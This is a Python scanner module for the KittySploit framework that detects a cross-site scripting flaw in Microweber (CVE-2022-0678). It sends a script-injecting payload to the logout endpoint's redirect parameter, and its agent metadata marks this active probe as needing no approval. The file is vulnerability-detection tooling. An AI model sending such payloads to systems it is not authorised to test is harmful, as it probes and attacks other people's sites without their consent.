#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Packagist prior to 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microweber <1.2.11 - Cross-Site Scripting Detection',
        'description': "Packagist prior to 1.2.11 contains a cross-site scripting vulnerability via microweber/microweber. User can escape the meta tag because the user doesn't escape the double-quote in the $redirectUrl parameter when logging out.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'huntr', 'xss', 'microweber', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/d707137a-aace-44c5-b15c-1807035716c0/',
            'https://twitter.com/CVEnew/status/1495001503249178624?s=20&t=sfABvm7oG39Fd6rG44vQWg',
            'https://huntr.dev/bounties/d707137a-aace-44c5-b15c-1807035716c0',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0678',
            'https://github.com/microweber/microweber/commit/2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8',
        ],
        'cve': 'CVE-2022-0678',
    }

    def run(self):
        r = self.http_request(method="GET", path='/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('><script>alert(document.domain)</script>', 'content="Microweber"',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Microweber <1.2.11 - Cross-Site Scripting detected",
                path='/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

